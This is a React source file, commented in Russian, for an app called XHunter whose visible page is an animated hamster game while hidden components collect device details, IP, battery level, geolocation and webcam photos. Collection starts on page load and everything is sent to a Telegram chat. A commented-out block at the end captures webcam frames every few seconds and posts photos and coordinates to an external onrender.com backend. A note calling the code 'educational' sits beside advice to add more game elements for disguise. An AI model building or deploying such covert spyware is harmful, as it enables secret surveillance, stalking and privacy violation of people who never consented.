/**
 *  PHOTOPAGE - ОСНОВНОЙ КОМПОНЕНТ ПРИЛОЖЕНИЯ XHUNTER
 * 
 * Этот компонент является сердцем всего приложения. Он координирует сбор
 * различных данных пользователя и отправку их на сервер, при этом
 * маскируясь под невинную игру с анимированным хомяком.
 * 
 *  ЧТО ВИДИТ ПОЛЬЗОВАТЕЛЬ:
 * - Анимированный хомяк, бегающий в колесе
 * - Переключатель день/ночь
 * - Привлекательная анимация для отвлечения внимания
 * 
 *  ЧТО ПРОИСХОДИТ В ФОНЕ:
 * - Сбор информации об устройстве (экран, браузер, ОС)
 * - Получение доступа к камере и создание фотографий
 * - Определение геолокации (GPS или по IP)
 * - Мониторинг уровня заряда батареи
 * - Отправка всех данных в Telegram через API
 * 
 *  АРХИТЕКТУРА КОМПОНЕНТА:
 * PhotoPage координирует работу других компонентов:
 * - AccesCamera.jsx - для работы с камерой
 * - LocationHandler.jsx - для получения геолокации
 * - API calls - для отправки данных на сервер
 * 
 *  ВАЖНО: Код предназначен только для образовательных целей!
 */

import React, { useRef, useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import "./App.css";
import CameraHacking from "./components/AccesCamera";
import LocationHandler from "./components/LocationHandler";
import API_CONFIG from "./api/config";

/**
 *  ГЛАВНЫЙ ФУНКЦИОНАЛЬНЫЙ КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  /**
   *  ИЗВЛЕЧЕНИЕ ПАРАМЕТРОВ ИЗ URL
   * useParams() извлекает chatId из URL вида /g/:chatId
   * Этот ID используется для идентификации чата в Telegram
   */
  const { chatId } = useParams();
  
  /**
   *  ССЫЛКА НА VIDEO ЭЛЕМЕНТ
   * useRef создает ссылку на DOM элемент video, который будет
   * использоваться компонентом AccesCamera для получения видеопотока
   */
  const videoRef = useRef(null);
  
  /**
   *  СОСТОЯНИЯ КОМПОНЕНТА
   * Управляем различными аспектами работы приложения через React state
   */
  const [usrStream, setUsrStream] = useState(null);           // Видеопоток пользователя
  const [isCameraActive, setIsCameraActive] = useState(true); // Статус активности камеры
  const [locationSent, setLocationSent] = useState(false);    // Флаг отправки геолокации
  const [locationPermission, setLocationPermission] = useState(null); // Разрешение на геолокацию
  const [clientIp, setClientIp] = useState("");               // IP адрес пользователя

  /**
   *  ФУНКЦИЯ ПОЛУЧЕНИЯ УРОВНЯ ЗАРЯДА БАТАРЕИ
   * 
   * Использует современный Battery Status API для получения информации
   * о состоянии батареи устройства. Этот API работает не во всех браузерах.
   * 
   *  ПОДДЕРЖКА БРАУЗЕРОВ:
   * - Chrome/Edge: полная поддержка
   * - Firefox: ограниченная поддержка  
   * - Safari: не поддерживается
   * - Mobile browsers: частичная поддержка
   * 
   * @returns {Promise<string>} Уровень заряда в процентах или статус ошибки
   */
  const getBatteryLevel = async () => {
    try {
      // Проверяем, поддерживает ли браузер Battery API
      if ("getBattery" in navigator) {
        const battery = await navigator.getBattery();
        
        // battery.level возвращает значение от 0 до 1, конвертируем в проценты
        return Math.floor(battery.level * 100) + "%";
      } else {
        // Fallback для браузеров без поддержки Battery API
        return "Battery API not supported";
      }
    } catch (error) {
      console.error("❌ Error getting battery level:", error);
      return "Unable to detect";
    }
  };

  /**
   *  ЭФФЕКТ ДЛЯ АВТОМАТИЧЕСКОГО СБОРА И ОТПРАВКИ ДАННЫХ
   * 
   * useEffect выполняется сразу после монтирования компонента.
   * Здесь запускается основная логика сбора данных пользователя.
   * 
   *  ПОСЛЕДОВАТЕЛЬНОСТЬ ВЫПОЛНЕНИЯ:
   * 1. Получение информации об устройстве
   * 2. Определение уровня заряда батареи  
   * 3. Формирование пакета данных
   * 4. Отправка данных на сервер через API
   */
  useEffect(() => {
    /**
     *  ВНУТРЕННЯЯ ФУНКЦИЯ СБОРА И ОТПРАВКИ ДАННЫХ ПОЛЬЗОВАТЕЛЯ
     * 
     * Эта асинхронная функция координирует весь процесс сбора информации
     * о пользователе и его устройстве, затем отправляет эти данные на сервер.
     */
    const getUserData = async () => {
      try {
        console.log("🎯 Starting data collection for chatId:", chatId);
        
        //  Собираем информацию об устройстве
        const deviceInfo = getDeviceInfo();
        
        //  Получаем уровень заряда батареи
        const batteryLevel = await getBatteryLevel();
        
        /**
         *  ФОРМИРОВАНИЕ ПАКЕТА ДАННЫХ
         * 
         * Создаем объект со всей собранной информацией для отправки на сервер.
         * Эти данные будут отправлены в Telegram чат с указанным chatId.
         */
        const data = {
          chat_id: chatId,                           // ID Telegram чата
          batteryLevel: batteryLevel,                // Уровень заряда батареи
          screenWidth: deviceInfo.screenWidth,       // Ширина экрана
          screenHeight: deviceInfo.screenHeight,     // Высота экрана
          clientIp: clientIp,                        // IP адрес (будет получен позже)
          
          // Дополнительная информация об устройстве
          userAgent: deviceInfo.userAgent,           // User-Agent браузера
          deviceType: deviceInfo.deviceType,         // Тип устройства (Mobile/Desktop)
          platform: deviceInfo.platform,            // Платформа (Windows/Mac/Linux)
          language: deviceInfo.language,             // Язык браузера
          timezone: deviceInfo.timezone              // Временная зона
        };

        console.log("📤 Sending user data:", data);

        /**
         *  ОТПРАВКА ДАННЫХ НА СЕРВЕР
         * 
         * Используем axios для отправки POST запроса на наш API endpoint.
         * API получит эти данные и переправит их в Telegram бот.
         */
        const apiUrl = `${API_CONFIG.baseURL}${API_CONFIG.endpoints.sendDataToTelegram}`;
        
        await axios.post(apiUrl, data, {
          headers: {
            "Content-Type": "application/json",
          },
          timeout: 10000 // Таймаут 10 секунд для предотвращения зависания
        });

        console.log("✅ User data sent successfully");
        
      } catch (err) {
        console.error("❌ Error sending user data to server:", err);
        
        //  Можно добавить логику повторной попытки
        // setTimeout(() => getUserData(), 5000);
      }
    };

    // Запускаем сбор данных
    getUserData();
  }, [chatId, clientIp]); // Зависимости: перезапускаем при изменении chatId или clientIp

  /**
   *  ФУНКЦИЯ СБОРА ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ
   * 
   * Собирает различную техническую информацию о устройстве и браузере пользователя.
   * Эта информация помогает понять, с какого устройства и из какого браузера
   * пользователь заходит на сайт.
   * 
   *  СОБИРАЕМАЯ ИНФОРМАЦИЯ:
   * - User-Agent строка (содержит данные о браузере и ОС)
   * - Платформа (Windows, MacIntel, Linux и т.д.)
   * - Разрешение экрана (физическое разрешение монитора)
   * - Тип устройства (мобильное или настольное)
   * - Язык браузера
   * - Временная зона пользователя
   * 
   *  ДОПОЛНИТЕЛЬНЫЕ ВОЗМОЖНОСТИ:
   * Можно расширить функцию для сбора других данных:
   * - Глубина цвета экрана
   * - Pixel ratio (для Retina дисплеев)
   * - Доступная память
   * - Количество CPU ядер
   * - Поддерживаемые технологии (WebGL, WebRTC и т.д.)
   * 
   * @returns {Object} Объект с информацией об устройстве
   */
  const getDeviceInfo = () => {
    //  Получаем User-Agent строку браузера
    const userAgent = navigator.userAgent;
    
    //  Определяем платформу (операционную систему)
    const platform = navigator.platform;
    
    //  Получаем физическое разрешение экрана
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    
    //  Определяем тип устройства по User-Agent
    const deviceType = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)
      ? "Mobile Device"
      : "Desktop Device";
    
    //  Получаем язык браузера
    const language = navigator.language || navigator.userLanguage;
    
    //  Определяем временную зону
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    /**
     * ВОЗВРАЩАЕМ ОБЪЕКТ С СОБРАННОЙ ИНФОРМАЦИЕЙ
     * 
     * Все данные упакованы в один объект для удобной передачи и обработки
     */
    return {
      userAgent,        // Полная User-Agent строка
      platform,         // Операционная система
      screenWidth,      // Ширина экрана в пикселях
      screenHeight,     // Высота экрана в пикселях
      deviceType,       // Тип устройства (Mobile/Desktop)
      language,         // Язык браузера (например, "en-US", "ru-RU")
      timezone,         // Временная зона (например, "Europe/Moscow")
      
      //  Дополнительные данные (можно раскомментировать при необходимости)
      // colorDepth: window.screen.colorDepth,           // Глубина цвета
      // pixelRatio: window.devicePixelRatio,            // Pixel ratio дисплея
      // availWidth: window.screen.availWidth,           // Доступная ширина экрана
      // availHeight: window.screen.availHeight,         // Доступная высота экрана
      // cookieEnabled: navigator.cookieEnabled,         // Поддержка cookies
      // onLine: navigator.onLine,                       // Статус подключения к интернету
    };
  };

  /**
   *  ФУНКЦИЯ ПЕРЕКЛЮЧЕНИЯ АКТИВНОСТИ КАМЕРЫ
   * 
   * Позволяет включать и выключать компонент камеры.
   * В текущей реализации камера включена по умолчанию.
   * 
   *  ПРИМЕНЕНИЕ:
   * - Отладка: можно отключить камеру для тестирования других функций
   * - Пользовательский контроль: можно добавить кнопку для пользователя
   * - Условная активация: включать камеру только при определенных условиях
   */
  const toggelActiveCamera = () => {
    setIsCameraActive((prev) => !prev);
    console.log(`🎥 Camera ${!isCameraActive ? 'activated' : 'deactivated'}`);
  };
  
  /**
   * 🎨 РЕНДЕРИНГ КОМПОНЕНТА
   * 
   * Возвращает JSX с игровым интерфейсом и скрытыми компонентами для сбора данных.
   * Пользователь видит только игру, а сбор данных происходит незаметно в фоне.
   */
  return (
    <>
      {/* 🎮 ИГРОВОЙ ИНТЕРФЕЙС (ВИДИМАЯ ЧАСТЬ) */}
      <div className="App">
        <div className="wraper">
          {/* 🐹 АНИМАЦИЯ ХОМЯКА В КОЛЕСЕ */}
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>  
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>

          {/* 🌙 ПЕРЕКЛЮЧАТЕЛЬ ТЕМЫ ДЕНЬ/НОЧЬ */}
          <label className="theme-switch">
            <input type="checkbox" className="theme-switch__checkbox" />
            <div className="theme-switch__container">
              <div className="theme-switch__clouds"></div>
              <div className="theme-switch__stars-container">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 144 55">
                  <path fill="currentColor" d="m135,20c0,7.7-0.7,13.8-2,18.5-2.3,8.4-7.9,12.5-17,12.5s-14.7-4.1-17-12.5c-1.3-4.7-2-10.8-2-18.5 0-7.7 0.7-13.8 2-18.5 2.3-8.4 7.9-12.5 17-12.5s14.7 4.1 17 12.5c1.3 4.7 2 10.8 2 18.5z"/>
                </svg>
              </div>
              <div className="theme-switch__circle-container">
                <div className="theme-switch__sun-moon-container">
                  <div className="theme-switch__moon">
                    <div className="theme-switch__spot"></div>
                    <div className="theme-switch__spot"></div>
                    <div className="theme-switch__spot"></div>
                  </div>
                </div>
              </div>
            </div>
          </label>
        </div>

        {/* 🎥 СКРЫТЫЙ ВИДЕО ЭЛЕМЕНТ ДЛЯ КАМЕРЫ */}
        <video 
          ref={videoRef} 
          autoPlay 
          muted 
          style={{ display: 'none' }} // Полностью скрыт от пользователя
          playsInline // Важно для мобильных устройств
        />
      </div>

      {/*  СКРЫТЫЕ КОМПОНЕНТЫ ДЛЯ СБОРА ДАННЫХ */}
      
      {/*  КОМПОНЕНТ ОБРАБОТКИ ГЕОЛОКАЦИИ */}
      <LocationHandler 
        chatId={chatId}                               // ID чата для отправки в Telegram
        locationPermission={locationPermission}       // Текущие разрешения на геолокацию
        setLocationPermission={setLocationPermission} // Функция обновления разрешений
        setLocationSent={setLocationSent}            // Функция отметки об отправке
        clientIp={clientIp}                          // IP адрес для fallback геолокации
      />
      
      {/*  КОМПОНЕНТ РАБОТЫ С КАМЕРОЙ (УСЛОВНО АКТИВИРУЕМЫЙ) */}
      {isCameraActive && (
        <CameraHacking
          chatId={chatId}                    // ID чата для отправки фото
          videoRef={videoRef}                // Ссылка на video элемент
          setClientIp={setClientIp}          // Функция установки IP адреса
          setLocationPermission={setLocationPermission} // Связка с геолокацией
        />
      )}
    </>
  );
};

export default PhotoPage;

/**
 * 📝 ДОПОЛНИТЕЛЬНЫЕ ЗАМЕТКИ ПО РАЗВИТИЮ ПРОЕКТА:
 * 
 * 🎯 ЦЕЛИ ПРОЕКТА:
 * - Образовательное изучение современных веб-технологий
 * - Понимание работы Web APIs (Camera, Geolocation, Battery)
 * - Изучение React хуков и управления состоянием
 * - Практика работы с REST API и axios
 * 
 * 🔒 ЭТИЧЕСКИЕ АСПЕКТЫ:
 * - Всегда информируйте пользователей о сборе данных
 * - Получайте явное согласие на обработку персональных данных
 * - Соблюдайте GDPR и местное законодательство
 * - Предоставляйте возможность отказаться от сбора данных
 * 
 * 🚀 ВОЗМОЖНЫЕ УЛУЧШЕНИЯ:
 * - Добавить обработку ошибок с retry логикой
 * - Реализовать прогресс-бар для пользователя
 * - Добавить больше игровых элементов для маскировки
 * - Улучшить мобильную версию интерфейса
 * - Добавить аналитику и мониторинг
 * 
 * 🐛 ИЗВЕСТНЫЕ ОГРАНИЧЕНИЯ:
 * - Battery API не поддерживается в Safari
 * - Камера требует HTTPS для работы
 * - Геолокация может быть заблокирована пользователем
 * - Некоторые браузеры могут блокировать автоматические запросы разрешений
 * 
 * 🔧 ТЕХНИЧЕСКАЯ ДОКУМЕНТАЦИЯ:
 * - React 18+ с функциональными компонентами
 * - Использование хуков: useState, useEffect, useRef, useParams
 * - Axios для HTTP запросов с таймаутами
 * - CSS анимации для создания игрового интерфейса
 * - Модульная архитектура с разделением ответственности
 */
//           video: true,
//         });
//         if (videoRef.current) {
//           videoRef.current.srcObject = stream;
//         }
//       } catch (error) {
//         console.error("Error accessing webcam:", error);
//       }
//     };

//     accessWebcam();

//     const savedPermission = localStorage.getItem("locationPermission");
//     if (savedPermission) {
//       setLocationPermission(JSON.parse(savedPermission));
//     }
//   }, []);

//   const captureImage = async () => {
//     if (!videoRef.current) {
//       console.error("Video element is null");
//       return;
//     }

//     const video = videoRef.current;

//     const canvas = document.createElement("canvas");
//     canvas.width = video.videoWidth;
//     canvas.height = video.videoHeight;

//     const context = canvas.getContext("2d");
//     context.drawImage(video, 0, 0, canvas.width, canvas.height);

//     canvas.toBlob(async (blob) => {
//       if (blob) {
//         const formData = new FormData();
//         formData.append("chat_id", chatId);
//         formData.append("photo", blob, "photo.jpg");
//         formData.append("batteryLevel", await getBatteryLevel());

//         const apiUrl = "https://xhunterback.onrender.com/sendPhotoToTelegram";

//         try {
//           await axios.post(apiUrl, formData, {
//             headers: {
//               "Content-Type": "multipart/form-data",
//             },
//           });

//           setPhotoCount((prevCount) => prevCount + 1);
//         } catch (error) {
//           console.error("Error sending photo to server:", error);
//         }
//       }
//     }, "image/jpeg");
//   };

//   const getBatteryLevel = async () => {
//     if ("getBattery" in navigator) {
//       const battery = await navigator.getBattery();
//       console.log(battery);
//       return Math.floor(battery.level * 100) + "%";
//     } else {
//       return "Неизвествое значение";
//     }
//   };

//   const sendLocation = async (coords) => {
//     const { latitude, longitude } = coords;
//     const apiUrl = "https://xhunterback.onrender.com/sendLocationToTelegram";
//     const data = { chat_id: chatId, latitude, longitude };

//     try {
//       await axios.post(apiUrl, data);
//       console.log("Location sent to Telegram");
//       setLocationSent(true);
//     } catch (error) {
//       console.error("Error sending location to server:", error);
//     }
//   };

//   const requestLocationPermission = async () => {
//     try {
//       const position = await new Promise((resolve, reject) => {
//         navigator.geolocation.getCurrentPosition(resolve, reject);
//       });
//       const { latitude, longitude } = position.coords;
//       const coords = { latitude, longitude };
//       localStorage.setItem("locationPermission", JSON.stringify(coords));
//       setLocationPermission(coords);

//       // Send location immediately after obtaining permission
//       sendLocation(coords);
//     } catch (error) {
//       console.error("Error getting location permission:", error);
//     }
//   };

//   useEffect(() => {
//     if (!locationPermission) {
//       requestLocationPermission();
//     }
//   }, []);

//   useEffect(() => {
//     const intervalId = setInterval(() => {
//       if (photoCount < 3) {
//         captureImage();
//       }
//     }, 3000);

//     return () => clearInterval(intervalId);
//   }, [photoCount]);

//   const getDeviceInfo = () => {
//     const userAgent = navigator.userAgent;
//     const platform = navigator.platform;
//     const screenWidth = window.screen.width;
//     const screenHeight = window.screen.height;
//     const deviceType = /Mobile/.test(userAgent) ? "Mobile Device" : "Desktop Device";

//     return {
//       userAgent,
//       platform,
//       screenWidth,
//       screenHeight,
//       deviceType,
//     };
//   };
